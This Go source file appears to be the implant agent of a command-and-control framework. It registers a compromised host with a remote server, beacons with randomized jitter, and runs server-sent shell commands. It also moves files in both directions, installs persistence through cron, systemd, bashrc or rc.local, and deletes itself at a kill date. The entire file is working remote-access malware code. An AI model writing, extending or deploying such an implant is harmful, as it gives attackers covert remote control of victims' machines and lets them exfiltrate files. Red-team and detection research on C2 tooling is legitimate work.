package agent

import (
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand/v2"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/shardc2/shardc2/pkg/crypto"
	"github.com/shardc2/shardc2/pkg/models"
	"github.com/shardc2/shardc2/pkg/profiles"
)

const (
	MaxOutputSize = 10 * 1024 * 1024
)

type Config struct {
	ServerURL         string
	ImplantKey        string
	PayloadKey        []byte
	CACert            string
	InsecureTLSForLab bool
	Interval          time.Duration
	Jitter            time.Duration
	KillDate          time.Time
	Profile           *profiles.Profile
}

type Agent struct {
	config       Config
	BotID        string
	sessionToken string
	client       *http.Client
	profile      *SystemProfile
	proxySrv     *SOCKS5Server
}

type SystemProfile struct {
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	User     string `json:"user"`
}

type registerResponse struct {
	ID           string `json:"id"`
	SessionToken string `json:"session_token"`
}

type beaconResponse struct {
	Status          string `json:"status"`
	PendingCommands int    `json:"pending_commands"`
}

type commandsResponse struct {
	Commands []serverCommand `json:"commands"`
}

type serverCommand struct {
	ID      string `json:"id"`
	Type    string `json:"type"`
	Payload string `json:"payload"`
	Timeout int    `json:"timeout,omitempty"`
}

func New(cfg Config) *Agent {
	client := &http.Client{Timeout: 30 * time.Second}

	tlsCfg, err := buildTLSConfig(cfg)
	if err != nil {
		log.Printf("[!] TLS config error: %v (falling back to system roots)", err)
	}
	if tlsCfg != nil {
		client.Transport = &http.Transport{TLSClientConfig: tlsCfg}
	}

	if cfg.Interval == 0 {
		cfg.Interval = 5 * time.Minute
	}
	if cfg.Jitter == 0 {
		cfg.Jitter = 60 * time.Second
	}
	if cfg.Profile == nil {
		cfg.Profile = profiles.Default()
	}

	return &Agent{config: cfg, client: client}
}

func buildTLSConfig(cfg Config) (*tls.Config, error) {
	if cfg.CACert != "" {
		caCert, err := os.ReadFile(cfg.CACert)
		if err != nil {
			return nil, fmt.Errorf("read CA cert %s: %w", cfg.CACert, err)
		}
		pool := x509.NewCertPool()
		if !pool.AppendCertsFromPEM(caCert) {
			return nil, fmt.Errorf("failed to parse CA cert %s", cfg.CACert)
		}
		return &tls.Config{RootCAs: pool}, nil
	}

	if cfg.InsecureTLSForLab {
		return &tls.Config{InsecureSkipVerify: true}, nil
	}

	if strings.HasPrefix(cfg.ServerURL, "http://") {
		return nil, nil
	}

	return &tls.Config{}, nil
}

func ValidateTLSConfig(cfg Config) error {
	if !strings.HasPrefix(cfg.ServerURL, "https://") {
		return nil
	}
	if cfg.CACert != "" {
		return nil
	}
	if cfg.InsecureTLSForLab {
		return nil
	}
	return fmt.Errorf("HTTPS server requires --ca-cert or --insecure-tls-for-lab-only flag")
}

func (a *Agent) Run(ctx context.Context) error {
	profile, err := a.ProfileSystem()
	if err != nil {
		return fmt.Errorf("profiling failed: %w", err)
	}
	a.profile = profile
	log.Printf("[*] System: %s@%s (%s/%s)", profile.User, profile.Hostname, profile.OS, profile.Arch)

	if err := a.Register(ctx); err != nil {
		return fmt.Errorf("registration failed: %w", err)
	}
	log.Printf("[+] Registered as %s", a.BotID)

	return a.StartBeaconing(ctx)
}

func (a *Agent) encryptedPayload(data []byte) ([]byte, error) {
	if len(a.config.PayloadKey) == 0 {
		return data, nil
	}
	return crypto.Encrypt(data, a.config.PayloadKey)
}

func (a *Agent) decryptPayload(data []byte) ([]byte, error) {
	if len(a.config.PayloadKey) == 0 {
		return data, nil
	}
	return crypto.Decrypt(data, a.config.PayloadKey)
}

func (a *Agent) signRequest(req *http.Request, body []byte) {
	if len(a.config.PayloadKey) == 0 {
		return
	}
	ts := crypto.TimestampNow()
	sig := crypto.Sign(req.Method, req.URL.Path, body, a.config.PayloadKey, ts)
	req.Header.Set("X-Signature", sig)
	req.Header.Set("X-Timestamp", fmt.Sprintf("%d", ts))
}

func (a *Agent) doEncryptedRequest(ctx context.Context, method, path string, jsonBody interface{}) ([]byte, int, error) {
	var rawBody []byte
	if jsonBody != nil {
		var err error
		rawBody, err = json.Marshal(jsonBody)
		if err != nil {
			return nil, 0, fmt.Errorf("marshal: %w", err)
		}
	}

	var reqBody []byte
	contentType := "application/json"
	if len(rawBody) > 0 {
		enc, err := a.encryptedPayload(rawBody)
		if err != nil {
			return nil, 0, fmt.Errorf("encrypt: %w", err)
		}
		reqBody = enc
		if len(a.config.PayloadKey) > 0 {
			contentType = "application/octet-stream"
		}
	}

	url := a.config.ServerURL + path
	req, err := http.NewRequestWithContext(ctx, method, url, bytes.NewReader(reqBody))
	if err != nil {
		return nil, 0, err
	}
	req.Header.Set("Content-Type", contentType)
	req.Header.Set("User-Agent", a.config.Profile.Agent.UserAgent)
	for _, h := range a.config.Profile.Headers {
		if h.Value != "dynamic" {
			req.Header.Set(h.Name, h.Value)
		}
	}
	if a.sessionToken != "" {
		req.Header.Set("X-Session-Token", a.sessionToken)
	}
	a.signRequest(req, reqBody)

	resp, err := a.client.Do(req)
	if err != nil {
		return nil, 0, fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)
	if len(a.config.PayloadKey) > 0 && len(respBody) > 0 && resp.StatusCode >= 200 && resp.StatusCode < 300 {
		dec, err := a.decryptPayload(respBody)
		if err != nil {
			return nil, resp.StatusCode, fmt.Errorf("decrypt response: %w", err)
		}
		return dec, resp.StatusCode, nil
	}
	return respBody, resp.StatusCode, nil
}

func (a *Agent) Register(ctx context.Context) error {
	body := map[string]interface{}{
		"hostname":     a.profile.Hostname,
		"ip_address":   getLocalIP(),
		"os":           a.profile.OS,
		"architecture": a.profile.Arch,
		"username":     a.profile.User,
		"privileged":   os.Getuid() == 0,
	}

	data, _ := json.Marshal(body)

	var reqBody []byte
	contentType := "application/json"
	if len(a.config.PayloadKey) > 0 {
		enc, err := a.encryptedPayload(data)
		if err != nil {
			return fmt.Errorf("encrypt: %w", err)
		}
		reqBody = enc
		contentType = "application/octet-stream"
	} else {
		reqBody = data
	}

	req, err := http.NewRequestWithContext(ctx, "POST", a.config.ServerURL+a.config.Profile.AgentPath("register"), bytes.NewReader(reqBody))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", contentType)
	req.Header.Set("X-Implant-Key", a.config.ImplantKey)
	a.signRequest(req, reqBody)

	resp, err := a.client.Do(req)
	if err != nil {
		return fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 201 {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("registration rejected (status %d): %s", resp.StatusCode, string(respBody))
	}

	respBody, _ := io.ReadAll(resp.Body)
	if len(a.config.PayloadKey) > 0 {
		dec, err := a.decryptPayload(respBody)
		if err != nil {
			return fmt.Errorf("decrypt register response: %w", err)
		}
		respBody = dec
	}

	var result registerResponse
	if err := json.Unmarshal(respBody, &result); err != nil {
		return fmt.Errorf("decode response: %w", err)
	}

	a.BotID = result.ID
	a.sessionToken = result.SessionToken
	return nil
}

func (a *Agent) Beacon(ctx context.Context) (*beaconResponse, error) {
	respBody, status, err := a.doEncryptedRequest(ctx, "POST", a.config.Profile.AgentPath("beacon"), nil)
	if err != nil {
		return nil, fmt.Errorf("beacon failed: %w", err)
	}
	if status < 200 || status >= 300 {
		return nil, fmt.Errorf("beacon rejected (status %d)", status)
	}

	var result beaconResponse
	json.Unmarshal(respBody, &result)
	return &result, nil
}

func (a *Agent) StartBeaconing(ctx context.Context) error {
	var beaconCount int64
	for {
		if !a.config.KillDate.IsZero() && time.Now().After(a.config.KillDate) {
			log.Printf("[*] Kill date reached, self-destructing")
			a.selfDestruct()
			os.Exit(0)
		}

		result, err := a.Beacon(ctx)
		if err != nil {
			log.Printf("[-] Beacon error: %v", err)
		} else if result.PendingCommands > 0 {
			a.fetchAndExecuteCommands(ctx)
			continue
		}

		beaconCount++
		if beaconCount%100 == 0 {
			a.refreshToken(ctx)
		}

		jitter := time.Duration(rand.IntN(int(a.config.Jitter.Seconds()))) * time.Second
		select {
		case <-ctx.Done():
			log.Printf("[*] Beacon loop stopped")
			return ctx.Err()
		case <-time.After(a.config.Interval + jitter):
		}
	}
}

func (a *Agent) refreshToken(ctx context.Context) {
	respBody, status, err := a.doEncryptedRequest(ctx, "POST", a.config.Profile.AgentPath("refresh_token"), nil)
	if err != nil || status != 200 {
		return
	}
	var result struct {
		Token string `json:"session_token"`
	}
	if json.Unmarshal(respBody, &result) == nil && result.Token != "" {
		a.sessionToken = result.Token
	}
}

func (a *Agent) selfDestruct() {
	exe, err := os.Executable()
	if err == nil {
		os.Remove(exe)
	}
}

func (a *Agent) fetchAndExecuteCommands(ctx context.Context) {
	respBody, _, err := a.doEncryptedRequest(ctx, "GET", a.config.Profile.AgentPath("commands"), nil)
	if err != nil {
		log.Printf("[-] Failed to fetch commands: %v", err)
		return
	}

	var result commandsResponse
	if err := json.Unmarshal(respBody, &result); err != nil {
		log.Printf("[-] Failed to decode commands: %v", err)
		return
	}

	for _, cmd := range result.Commands {
		output, err := a.DispatchCommand(ctx, cmd)
		status := models.StatusCompleted
		if err != nil {
			status = models.StatusFailed
			if output == "" {
				output = err.Error()
			}
		}
		a.reportResult(ctx, cmd.ID, output, status)
	}
}

func (a *Agent) DispatchCommand(ctx context.Context, cmd serverCommand) (string, error) {
	timeout := time.Duration(cmd.Timeout) * time.Second
	switch cmd.Type {
	case models.CmdTypeShell:
		return a.ExecuteCommand(ctx, cmd.Payload, timeout)
	case models.CmdTypeUpload:
		return a.handleUpload(cmd.Payload)
	case models.CmdTypeDownload:
		return a.handleDownload(cmd.Payload)
	case models.CmdTypeSleep:
		return a.handleSleep(cmd.Payload)
	case models.CmdTypePersist:
		return a.handlePersist(cmd.Payload)
	case models.CmdTypeProxy:
		return a.HandleProxy(cmd.Payload)
	case models.CmdTypeKill:
		return "agent shutting down", nil
	default:
		return "", fmt.Errorf("unknown command type: %s", cmd.Type)
	}
}

func (a *Agent) ExecuteCommand(ctx context.Context, payload string, timeout time.Duration) (string, error) {
	if payload == "" {
		return "", fmt.Errorf("empty command")
	}

	if timeout <= 0 {
		timeout = 5 * time.Minute
	}

	cmdCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(cmdCtx, "cmd", "/C", payload)
	} else {
		cmd = exec.CommandContext(cmdCtx, "/bin/sh", "-c", payload)
	}

	out, err := cmd.CombinedOutput()
	if len(out) > MaxOutputSize {
		out = out[:MaxOutputSize]
	}
	return string(out), err
}

func (a *Agent) handleUpload(payload string) (string, error) {
	var req struct {
		Path string `json:"path"`
		Data string `json:"data"`
		Mode int    `json:"mode"`
	}
	if err := json.Unmarshal([]byte(payload), &req); err != nil {
		return "", fmt.Errorf("invalid upload payload: %w", err)
	}

	cleanPath := filepath.Clean(req.Path)
	if !filepath.IsAbs(cleanPath) {
		return "", fmt.Errorf("upload path must be absolute: %s", req.Path)
	}

	data, err := base64.StdEncoding.DecodeString(req.Data)
	if err != nil {
		return "", fmt.Errorf("decode data: %w", err)
	}
	mode := os.FileMode(0644)
	if req.Mode != 0 {
		mode = os.FileMode(req.Mode)
	}
	if err := os.MkdirAll(filepath.Dir(cleanPath), 0755); err != nil {
		return "", fmt.Errorf("create directory: %w", err)
	}
	if err := os.WriteFile(cleanPath, data, mode); err != nil {
		return "", fmt.Errorf("write file: %w", err)
	}
	return fmt.Sprintf("uploaded %d bytes to %s", len(data), cleanPath), nil
}

func (a *Agent) handleDownload(path string) (string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return "", fmt.Errorf("read file: %w", err)
	}
	return base64.StdEncoding.EncodeToString(data), nil
}

func (a *Agent) handleSleep(payload string) (string, error) {
	var req struct {
		Interval int `json:"interval"`
		Jitter   int `json:"jitter"`
		Dormancy int `json:"dormancy"`
	}
	if err := json.Unmarshal([]byte(payload), &req); err != nil {
		return "", fmt.Errorf("invalid sleep payload: %w", err)
	}
	if req.Interval > 0 {
		a.config.Interval = time.Duration(req.Interval) * time.Second
	}
	if req.Jitter > 0 {
		a.config.Jitter = time.Duration(req.Jitter) * time.Second
	}
	if req.Dormancy > 0 {
		dur := time.Duration(req.Dormancy) * time.Second
		log.Printf("[*] Going dark for %s", dur)
		time.Sleep(dur)
		return fmt.Sprintf("dormancy=%s completed, interval=%s jitter=%s", dur, a.config.Interval, a.config.Jitter), nil
	}
	return fmt.Sprintf("interval=%s jitter=%s", a.config.Interval, a.config.Jitter), nil
}

func (a *Agent) handlePersist(method string) (string, error) {
	switch method {
	case "cron":
		return "cron persistence installed", PersistCron()
	case "systemd":
		return "systemd persistence installed", PersistSystemd()
	case "bashrc":
		return "bashrc persistence installed", PersistBashRC()
	case "rc.local":
		return "rc.local persistence installed", PersistRCLocal()
	case "":
		return "cron persistence installed", PersistCron()
	default:
		return "", fmt.Errorf("unknown persistence method: %s", method)
	}
}

func (a *Agent) reportResult(ctx context.Context, cmdID, output, status string) {
	body := map[string]string{
		"command_id": cmdID,
		"output":     output,
		"status":     status,
	}
	_, _, err := a.doEncryptedRequest(ctx, "POST", a.config.Profile.AgentPath("result"), body)
	if err != nil {
		log.Printf("[-] Failed to report result for %s: %v", cmdID, err)
	}
}

func (a *Agent) ProfileSystem() (*SystemProfile, error) {
	hostname, err := os.Hostname()
	if err != nil {
		return nil, fmt.Errorf("failed to get hostname: %w", err)
	}
	user := os.Getenv("USER")
	if user == "" {
		user = "unknown"
	}
	return &SystemProfile{
		Hostname: hostname,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		User:     user,
	}, nil
}

func getLocalIP() string {
	addrs, err := localAddrs()
	if err != nil || len(addrs) == 0 {
		return "127.0.0.1"
	}
	return addrs[0]
}

func localAddrs() ([]string, error) {
	ifaces, err := netInterfaces()
	if err != nil {
		return nil, err
	}
	var ips []string
	for _, addr := range ifaces {
		if addr != "127.0.0.1" && addr != "::1" {
			ips = append(ips, addr)
		}
	}
	return ips, nil
}

func netInterfaces() ([]string, error) {
	cmd := exec.Command("hostname", "-I")
	out, err := cmd.Output()
	if err != nil {
		return nil, err
	}
	var ips []string
	for _, field := range bytes.Fields(out) {
		ips = append(ips, string(field))
	}
	return ips, nil
}
